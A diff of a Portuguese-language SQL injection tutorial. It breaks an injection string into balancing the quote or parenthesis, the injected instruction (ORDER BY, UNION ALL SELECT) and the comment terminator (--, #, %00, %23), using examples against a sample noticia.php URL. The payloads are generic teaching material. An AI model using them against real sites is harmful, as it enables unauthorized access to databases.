@@ -18,17 +18,11 @@ EXs: id='10' -> id=10' order by 1--
 	 id=(10) -> id=10) order by 1-- 
 	 (id=(10)) -> id=10)) order by 1-- 
 	 
-	 www.vuln.com/noticia.php?id=10' order by 1--+-
-	                              '-'
-								BALANCEAMENTO
-	 
 == SEGUNDO FATOR "INSTRUÇÃO" ==
 
 -> Instrução é a segunda query criada pelo injetor, tudo que vem depois do balanceamento...
-EXs: www.vuln.com/noticia.php?id=10' order by 1--+-
-                                 '-''--------'
-					  BALANCEAMENTO  INSTRUÇÃO
-					 
+EXs: order by 1
+union all select 1,2,3					 
 					 
 == TERCEIRO FATOR "COMENTARIO" ==
 
@@ -39,11 +33,7 @@ EXs:
 --
 ;%00
 #
-%23
-
-www.vuln.com/noticia.php?id=10' order by 1--+-
-                           '-''--------' '---'
-				BALANCEAMENTO INSTRUÇÃO	COMENTARIO	
+%23	
 
 
 == FINALIZAÇÃO ==
